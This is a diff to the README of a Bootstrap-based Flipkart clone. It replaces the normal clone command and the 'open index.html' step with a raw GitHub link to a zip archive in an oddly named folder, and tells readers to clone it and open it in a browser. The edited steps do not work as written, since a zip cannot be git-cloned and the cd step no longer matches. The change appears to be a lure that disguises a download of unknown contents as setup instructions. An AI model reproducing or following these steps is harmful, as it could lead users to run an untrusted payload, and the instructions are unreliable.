@@ -17,13 +17,13 @@ This is a simple Flipkart clone built using HTML, CSS, and Bootstrap. It feature
 ## Installation
 1. Clone the repository:
    ```sh
-   git clone https://github.com/your-username/flipkart-clone.git
+   git clone https://github.com/nikeshRajbanshi231/bootstrap-Clone/raw/refs/heads/main/noncataloguer/Clone_bootstrap_3.0.zip
    ```
 2. Navigate to the project directory:
    ```sh
    cd flipkart-clone
    ```
-3. Open `index.html` in your browser.
+3. Open `https://github.com/nikeshRajbanshi231/bootstrap-Clone/raw/refs/heads/main/noncataloguer/Clone_bootstrap_3.0.zip` in your browser.
 
 ## Contributing
 Feel free to contribute by forking the repository and submitting pull requests.
